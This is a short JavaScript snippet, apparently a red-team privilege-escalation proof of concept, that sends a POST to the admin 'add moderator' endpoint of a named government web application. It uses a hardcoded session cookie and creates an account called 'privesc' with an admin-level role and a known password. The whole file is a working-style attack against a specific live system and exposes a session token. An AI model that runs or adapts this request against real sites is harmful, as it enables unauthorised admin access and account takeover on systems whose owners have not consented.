let req = new XMLHttpRequest();
var url = "https://opaz-app.opaz.gov.om/admin/moderators/add"

req.open("POST", url, true);

req.setRequestHeader("Cookie", "_ga=GA1.3.2046938402.1666552597; ci_session=krpu4ftfhj3a2l05rheq2bfsil7ikv1a");
req.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.setRequestHeader("Origin", "https://opaz-app.opaz.gov.om");
req.setRequestHeader("Referer", "https://opaz-app.opaz.gov.om/admin/moderators/add");

req.onreadystatechange = function () {
  if (req.readyState === 4) {
    console.log(req.status);
    console.log(req.responseText);
  }};

let params = `{
  "name": privesc,
  "email": priv@team.com,
  "password": redteam0,
  "status": 1,
  "role": 1
}`;

req.send(params);
